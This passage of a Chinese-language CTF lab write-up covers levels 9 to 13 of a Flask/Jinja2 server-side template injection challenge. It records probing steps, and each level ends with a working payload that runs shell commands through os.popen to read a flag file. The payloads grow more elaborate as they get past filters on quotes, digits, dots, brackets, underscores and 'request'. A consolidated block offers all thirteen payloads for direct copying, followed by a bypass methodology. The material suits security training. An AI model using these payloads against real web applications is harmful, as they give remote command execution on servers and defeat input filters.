**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（75 字符）

### 第 9 关：禁数字 `0-9`

**从头开始（第一次拿到这题，会这么一步步试）**

```text
第 1 次  {{7*7}}                                     -> Hello WAF   连探针都被拦 → 数字被禁
第 2 次  {{ lipsum }}                                -> 函数对象     换不含数字的探针 → 说明只禁数字，别的都还好
第 3 次  {{ lipsum['__globals__']['os']['popen']('cat /app/flag')['read']() }}   -> Hello SSTILAB{...}   这条链本来就没有数字
```

**每一步在想什么**

| 第几次 | 为什么这么试 | 看到的响应 | 这说明什么 → 下一步为什么这么改 |
|---|---|---|---|
| 1 | 发个 `{{7*7}}` 当探针 | `Hello WAF` | 连最简单的探针都过不去 → 被拦的是**数字**，不是语法 |
| 2 | 换个不含数字的探针 `{{ lipsum }}` | 正常，回函数对象 | 别的都没禁，只禁数字 |
| 3 | 直接用不含数字的框架链 | flag | 需要数字的只有"枚举子类下标"那条类链；框架链全是名字，天然免疫 |

**探测记录（实测）**

| 探针 | 实测响应 | 推断（现象 → 说明什么 → 对 payload 的影响） |
|---|---|---|
| `{{7*7}}` / `{{ 0 }}` / `{{ [1] }}` / `{{ 1+1 }}` | 全部 `Hello WAF` | 被拦的是**数字**（不是语法）—— 连最基本的探针都过不去，说明不是"表达式被禁" |
| `{{ dict(a=1)|first }}` | `Hello WAF` | 数字出现在哪里都被拦（连 kwargs 的值也不行） |
| `{{ lipsum }}` | 函数对象 | 换不含数字的探针就通过 → 证明"只禁数字"，容器和链都还好 |
| `{{ lipsum.__globals__|length }}` | `Hello 56` | 框架全局链**一个数字都没有** → 这关根本不用改 payload |

**推理**：需要数字的只有"枚举子类下标"那条类链；框架链全是名字，天然免疫。
所以这关**不用改 payload**。

**payload**

```jinja
{{ lipsum['__globals__']['os']['popen']('cat /app/flag')['read']() }}
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（69 字符，零数字）

### 第 10 关：预置 `config` / `self` 为空

**从头开始（第一次拿到这题，会这么一步步试）**

```text
第 1 次  {{ config }}                                -> Hello None  config 被置空了
第 2 次  {{ self }}                                  -> Hello None  self 也被置空
第 3 次  {{ lipsum }}                                -> 函数对象    换个起点照样能用
第 4 次  {{ lipsum.__globals__.os.popen('cat /app/flag').read() }}   -> Hello SSTILAB{...}   通过
```

**每一步在想什么**

| 第几次 | 为什么这么试 | 看到的响应 | 这说明什么 → 下一步为什么这么改 |
|---|---|---|---|
| 1 | 用 `config` 当起点试 | `Hello None` | config 被置空了（不是报错，是值变成 None） |
| 2 | 换 `self` 试 | `Hello None` | self 也被置空 → 说明关卡**预设了这两个名字**，不是字符过滤 |
| 3 | 试第三个起点 `lipsum` | 函数对象，正常 | 它没被动过 |
| 4 | 用 lipsum 拼链 | flag | 名字被废就换名字，跟语法无关 |

**探测记录（实测）**

| 探针 | 实测响应 | 推断（现象 → 说明什么 → 对 payload 的影响） |
|---|---|---|
| `{{ config }}` | `Hello None` | config 不是"取不到"，而是**值被设成了 None** → 说明关卡做了预设赋值，不是字符过滤 |
| `{{ self }}` | `Hello None` | self 同样被置空 → 该换的是**名字**，不是语法 |
| `{{ lipsum }}` | 函数对象 | 第三个起点没事 → Jinja2 自带的 6 个全局里还有替补 |
| 其余字符/关键词探针 | 全部正常 | 没有任何字符级过滤 → lipsum 那条链原样照搬即可 |

**推理**：关卡在 payload 前面拼了两条赋值语句，把这两个名字设成了 None。
被废掉的是**名字**，不是语法 → 换起点。

**payload**

```jinja
{{ lipsum.__globals__.os.popen('cat /app/flag').read() }}
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（57 字符，同第 1 关）

### 第 11 关：禁 `'` `"` `+` `request` `.` `[` `]`

**从头开始（第一次拿到这题，会这么一步步试）**

```text
第 1 次  {{ lipsum.__globals__['os'].popen('cat /app/flag').read() }}   -> Hello WAF   引号被禁
第 2 次  {{ lipsum['__globals__']['os']['popen']('cat /app/flag')['read']() }}   -> Hello WAF   中括号被禁
第 3 次  {{ lipsum.__globals__.os.popen('cat /app/flag').read() }}      -> Hello WAF   点号被禁
第 4 次  {{ lipsum.__globals__.os.popen(request.form.cmd).read() }}     -> Hello WAF   request 也被禁 → 参数通道断了
第 5 次  用 dict(名=1)|first 在模板里现造字符串                          -> Hello SSTILAB{...}   只剩这条路（330 字符）
```

**每一步在想什么**

| 第几次 | 为什么这么试 | 看到的响应 | 这说明什么 → 下一步为什么这么改 |
|---|---|---|---|
| 1 | 标准链（带引号） | `Hello WAF` | 引号被禁 |
| 2 | 全中括号版 | `Hello WAF` | 中括号也被禁 |
| 3 | 点号版 | `Hello WAF` | 点号也被禁 |
| 4 | 像第 5 关那样把命令放参数 | `Hello WAF` | `request` 也被禁 → 从外部取值的路断了 |
| 5 | 外部没有字符串来源，就在模板里现造：`dict(名=1)` 的**键名**本身就是字符串 | flag | 字符串既可以"从外面拿"，也可以"就地造" —— 这是"字符串从哪来"这个抽屉的最后一张牌 |

**探测记录（实测）**

| 探针 | 实测响应 | 推断（现象 → 说明什么 → 对 payload 的影响） |
|---|---|---|
| 引号 / 点号 / 中括号 / 加号 / request 探针 | 全部 `Hello WAF` | 五种东西一起禁 → **语法（点号、中括号）和外部通道（引号、request）同时断了** |
| `{{ lipsum }}` / `{{ config }}` / `{{ self }}` | 正常 | 起点还在 → 还有东西可以当跳板 |
| `{{ dict(a=1)|first }}` | `Hello a` | **kwargs 的键名本身就是字符串** → 不写引号也能造出任意名字（决定性） |
| 造名后取 os | `<module 'os' …>` | 证明"就地造字符串"这条路真能走通 → 整条链可以全靠造 |

**推理**：外部通道（引号、request）全断 → **只能在模板里造字符串**：

| 要造的 | 怎么造 |
|---|---|
| 任意名字 | 用 `dict(名=1)` 的键名，再用 `first` 过滤器取出来 |
| 斜杠 `/` | 取 `lipsum` 的 `__file__` 首字符（`/usr/local/lib/python3.9/site-packages/jinja2/utils.py`） |
| 空格 | 不用空格：`cat</app/flag`（shell 重定向） |
| 拼接 | 用 `~`（加号被禁） |

**payload**

```jinja
{% set g = lipsum|attr(dict(__globals__=1)|first) %}{% set s = g|attr(dict(get=1)|first)(dict(__file__=1)|first)|first %}{{ g|attr(dict(get=1)|first)(dict(os=1)|first)|attr(dict(popen=1)|first)((dict(cat=1)|first)~((lipsum|string)|first)~s~(dict(ap=1)|first)~(dict(p=1)|first)~s~(dict(flag=1)|first))|attr(dict(read=1)|first)() }}
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（330 字符 —— 这关的长度是黑名单逼出来的）

### 第 12 关：禁 `_` `.` 数字 `\` `'` `"` `[` `]`

**从头开始（第一次拿到这题，会这么一步步试）**

```text
第 1 次  第 11 关那条                                   -> Hello WAF   dict(__globals__=1) 里有下划线，命令里有引号
第 2 次  {{ dict(a=1)|first }}                        -> Hello WAF   数字也被禁
第 3 次  {{ dict(a=true)|first }}                     -> Hello a     用 true 顶替数字（这一步是关键）
第 4 次  {% set r = request|attr(dict(args=true)|first)|... %}  +  ?a=__globals__&b=cat /app/flag   -> Hello SSTILAB{...}
```

**每一步在想什么**

| 第几次 | 为什么这么试 | 看到的响应 | 这说明什么 → 下一步为什么这么改 |
|---|---|---|---|
| 1 | 先试第 11 关那条 | `Hello WAF` | 它里面有下划线（`__globals__`），还有引号 |
| 2 | 想知道数字还能不能用 | `Hello WAF` | 数字也被禁 |
| 3 | 给数字换个占位符（`1` 改成 `true`） | `Hello a` | 通过了 → `dict(名=true)` 一样能造出键名字符串 |
| 4 | 把躲不开的两个字符串（`__globals__`、命令）放查询参数，其余就地造 | flag | 外部通道 + 就地造串两条腿一起用 |

**探测记录（实测）**

| 探针 | 实测响应 | 推断（现象 → 说明什么 → 对 payload 的影响） |
|---|---|---|
| `{{ 0 }}` / `{{ 'q' }}` / `{{ a_b }}` / `{{ a.b }}` / `{{ [1] }}` | 全部 `Hello WAF` | 数字、引号、下划线、点号、中括号全禁 → 连"造字符串"的工具本身也被咬了两处 |
| `{{ dict(a=1)|first }}` | `Hello WAF` | 数字被拦（连 kwargs 的值都不能写 1） |
| `{{ request }}` | `<Request …>` | request 还能用 → **外部通道还在**（比第 11 关多一条路） |
| `{{ true }}` / `{{ dict(a=true)|first }}` | `Hello True` / `Hello a` | 布尔字面量可以顶替数字 → 造串工具复活（决定性） |

**推理**：名字写不出来（连 kwargs 名都不能带下划线）→ 只能从参数取；
数字被禁 → 占位值写 `true`。躲不开的只有两个字符串：`__globals__` 和命令 → 放查询参数。

**payload**

```jinja
{% set r = request|attr(dict(args=true)|first)|attr(dict(get=true)|first) %}{{ lipsum|attr(r(dict(a=true)|first))|attr(dict(get=true)|first)(dict(os=true)|first)|attr(dict(popen=true)|first)(r(dict(b=true)|first))|attr(dict(read=true)|first)() }}
```

查询串：

```text
?a=__globals__&b=cat /app/flag
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（246 字符 + 2 个参数）

### 第 13 关：全禁

**从头开始（第一次拿到这题，会这么一步步试）**

```text
第 1 次  第 12 关那条                                   -> Hello WAF   request 被禁 → 参数通道彻底断了
第 2 次  {{ lipsum.__globals__.os.popen('cat /app/flag').read() }}      -> Hello WAF   下划线、点号都不让写
第 3 次  {{ lipsum|string|list|batch(19)|first|last }}   -> Hello _     从对象的 repr 里抠出一个下划线（关键一步）
第 4 次  {% set u = ... %}{% set g = lipsum|attr((u~u)~...) %}...      -> Hello SSTILAB{...}   用它拼出 dunder（439 字符）
```

名单：下划线、点号、反斜杠、引号、request、加号、class、init、arg、config、app、self、中括号

**每一步在想什么**

| 第几次 | 为什么这么试 | 看到的响应 | 这说明什么 → 下一步为什么这么改 |
|---|---|---|---|
| 1 | 先试第 12 关那条 | `Hello WAF` | `request` 被禁 → 外部传参这条通道彻底没了 |
| 2 | 回到最常见的点号链 | `Hello WAF` | 下划线和点号都不让写 → 连 `__globals__` 都打不出来 |
| 3 | 那就从对象自己的字符串里抠字符：`lipsum` 的 repr 里正好有下划线 | `Hello _` | 拿到了一个 `_` → 可以用它拼出 `__globals__` 这种 dunder |
| 4 | 用抠出的 `_` 拼 dunder，斜杠从 `__file__` 取，命令用 `<` 省掉空格 | flag | 字符级"就地取材" —— "字符串从哪来"这个抽屉用到了尽头 |

**探测记录（实测）**

| 探针 | 实测响应 | 推断（现象 → 说明什么 → 对 payload 的影响） |
|---|---|---|
| `{{ 'q' }}` / `{{ a_b }}` / `{{ a.b }}` / `{{ [1] }}` / `{{ 1+1 }}` | 全部 `Hello WAF` | 字符级几乎全禁（引号、下划线、点号、中括号、加号） |
| `{{ config }}` / `{{ self }}` / `{{ request }}` | 全部 `Hello WAF` | 连 request 都被点名 → **外部通道彻底没了**（比第 12 关更狠） |
| `{{ class }}` / `{{ arg }}` / `{{ init }}` | 全部 `Hello WAF` | 关键词也禁 → 名字也不能靠常见词拼出来 |
| `{{ lipsum }}` / `{{ dict(a=1)|first }}` / `{{ true }}` | 正常 / `Hello a` / `Hello True` | 起点、造串工具、布尔字面量都还在 → 还有办法 |
| `{{ lipsum|string }}` | 函数 repr | 这个字符串里有下划线、点号、尖括号 → 是现成的**字符来源** |
| 抠第 19 个字符 | `Hello _` | 从对象自己的字符串里抠出被禁的字符 → 可以用它拼 `__globals__` 这类 dunder（决定性） |

**推理**：连一个下划线都写不出来 → 从对象自身提取字符，再用它拼 dunder：

```text
第 19 个字符 = _                    （<function generate_lorem_ipsum ...> 里 "generate_" 那个下划线）
(u~u)~(dict(globals=true)|first)~(u~u)      -> "__globals__"
dict(get=true)|first                -> "get"（对字典来说 get('os') 就够，不必造 __getitem__）
斜杠 = __file__ 首字符；命令 = cat + < + / + app + / + flag
```

**payload**

```jinja
{% set u = lipsum|string|list|batch(19)|first|last %}{% set g = lipsum|attr((u~u)~(dict(globals=true)|first)~(u~u)) %}{% set q = g|attr(dict(get=true)|first) %}{% set s = q((u~u)~(dict(file=true)|first)~(u~u))|first %}{% set c = (dict(cat=true)|first)~((lipsum|string)|first)~s~(dict(ap=true)|first)~(dict(p=true)|first)~s~(dict(flag=true)|first) %}{{ q(dict(os=true)|first)|attr(dict(popen=true)|first)(c)|attr(dict(read=true)|first)() }}
```

**实测**：`Hello SSTILAB{enjoy_flask_ssti}`（439 字符）

---

## 二、速查表

| 关 | 探测结论（实测） | 只换了什么 | payload 关键片段 | 长度 |
|---|---|---|---|---|
| 1 | 无过滤 | — | 标准全局链 | 57 |
| 2 | 只禁 `{{` | 容器 | `{% print(…) %}` | 64 |
| 3 | 输出被丢弃，只回 correct/wrong | 结果通道 | 命令里加重定向 `> /app/static/l3.txt` | 86 |
| 4 | 只禁 `[` `]` | 取键语法 | `.os` 代替 `['os']` | 57 |
| 5 | 只禁 `'` `"` | 命令来源 | `popen(request.form.cmd)` + `cmd=` | 58 |
| 6 | 只禁 `_` | 那一个名字 | `lipsum['\x5f\x5fglobals\x5f\x5f']` | 72 |
| 7 | 只禁 `.` | 点号换中括号 | `lipsum['__globals__']['os'][…]` | 69 |
| 8 | 12 个关键词 | 切碎两个词 | `['__glo'~'bals__']`、`['pop'~'en']` | 75 |
| 9 | 只禁数字 | 不用换 | 同 7（框架链本就无数字） | 69 |
| 10 | config/self 被置空 | 不用换 | 同 1（起点就是 lipsum） | 57 |
| 11 | 引号 点号 中括号 加号 request | 退不掉 | `dict(名=1)` 造名 + `~` 拼命令 | 330 |
| 12 | 再加下划线和数字 | 退不掉 | 只把 `__globals__` 和命令放参数 | 246 |
| 13 | 连下划线和 request 都没了 | 退不掉 | 抠字符造 dunder | 439 |

**13 条 payload 原文（同一个代码块，直接复制）**

```text
L1  {{ lipsum.__globals__.os.popen('cat /app/flag').read() }}
L2  {% print(lipsum.__globals__.os.popen('cat /app/flag').read()) %}
L3  {% set x = lipsum.__globals__.os.popen('cat /app/flag > /app/static/l3.txt').read() %}   （随后 GET /static/l3.txt）
L4  {{ lipsum.__globals__.os.popen('cat /app/flag').read() }}
L5  {{ lipsum.__globals__.os.popen(request.form.cmd).read() }}                               （附带 cmd=cat /app/flag）
L6  {{ lipsum['\x5f\x5fglobals\x5f\x5f'].os.popen('cat /app/flag').read() }}
L7  {{ lipsum['__globals__']['os']['popen']('cat /app/flag')['read']() }}
L8  {{ lipsum['__glo'~'bals__']['os']['pop'~'en']('cat /app/flag')['read']() }}
L9  {{ lipsum['__globals__']['os']['popen']('cat /app/flag')['read']() }}
L10 {{ lipsum.__globals__.os.popen('cat /app/flag').read() }}
L11 {% set g = lipsum|attr(dict(__globals__=1)|first) %}{% set s = g|attr(dict(get=1)|first)(dict(__file__=1)|first)|first %}{{ g|attr(dict(get=1)|first)(dict(os=1)|first)|attr(dict(popen=1)|first)((dict(cat=1)|first)~((lipsum|string)|first)~s~(dict(ap=1)|first)~(dict(p=1)|first)~s~(dict(flag=1)|first))|attr(dict(read=1)|first)() }}
L12 {% set r = request|attr(dict(args=true)|first)|attr(dict(get=true)|first) %}{{ lipsum|attr(r(dict(a=true)|first))|attr(dict(get=true)|first)(dict(os=true)|first)|attr(dict(popen=true)|first)(r(dict(b=true)|first))|attr(dict(read=true)|first)() }}   （附带 ?a=__globals__&b=cat /app/flag）
L13 {% set u = lipsum|string|list|batch(19)|first|last %}{% set g = lipsum|attr((u~u)~(dict(globals=true)|first)~(u~u)) %}{% set q = g|attr(dict(get=true)|first) %}{% set s = q((u~u)~(dict(file=true)|first)~(u~u))|first %}{% set c = (dict(cat=true)|first)~((lipsum|string)|first)~s~(dict(ap=true)|first)~(dict(p=true)|first)~s~(dict(flag=true)|first) %}{{ q(dict(os=true)|first)|attr(dict(popen=true)|first)(c)|attr(dict(read=true)|first)() }}
```

## 三、方法论总结

**三抽屉模型**（过滤禁什么，就去对应抽屉换零件）

| 抽屉 | 有哪些零件 | 什么时候用 |
|---|---|---|
| 字符串从哪来 | 字面量 / `~` 拼接 / `\x5f` 转义 / `dict(名=1)|first` / 请求参数 / 从对象抠字符 | 引号、关键词、下划线被禁 |
| 属性怎么取 | `.名` / `['名']` / `|attr('名')` / `|attr('__getitem__')('名')` / `|first` `|last` | 点号、中括号被禁 |
| 结果怎么写 | `{{ }}` / `{% print %}` / `{% if %}字面量` / 副作用写文件 | 定界符被禁 / 盲注 |

**时间差原理**：黑名单查的是**原文**；`~` 在渲染期拼接、`\x5f` 在编译期还原 →
引擎看到的永远比过滤器多。

**判断顺序**

```text
先探容器 -> 再探字符 -> 再探关键词 -> 按"被咬的零件"换写法 -> 最后才上"全套替换"
```

## 四、踩坑记录（都是这次实际踩到的）

| 坑 | 现象 | 原因 | 解决 |
|---|---|---|---|
| 假分支选错 | 第 3 关盲注一直回 correct | `{{ [][0] }}` 的 LookupError 被吞成 Undefined | 用 `{{1/0}}` 或 `{{ [].pop() }}` |
| 参数容器不匹配 | 第 5 关回 `No this level` | 取参用 `request.args`，字段却放在 POST body | 两边对齐，或改用 `request.values` |
| 数字被禁时探不出容器 | 第 9、12 关两个容器探针都被拦 | 探针自己带数字 | 换无数字探针 `{{ lipsum }}` |
| 竖线转义被一起复制 | 第 1 关回 `No this level` | markdown 表格的转义反斜杠跟着进了 payload | 从渲染视图复制，或去掉 `\` |
| `%` 格式化毁 payload | Python 报 unsupported format character | payload 含 `%}` 或 `{%`，与格式化冲突 | 一律用字符串拼接 |
| 斜杠来源失效 | 第 11 关命令拼成 `cat<NoneappNoneflag` | Flask 的 `SESSION_COOKIE_PATH` 默认是 None | 改用 `__file__` 首字符 |
| Windows 本地验证读不到文件 | `type` 报 syntax error | cmd 的 `type` 不认正斜杠和中文路径 | 本地用 `builtins.open` 读，别走 cmd |
| 测试客户端丢 Cookie | 本地验 Cookie 通道取到空 | 手写 Cookie 头被测试客户端忽略 | 用 `client.set_cookie(k, v)` |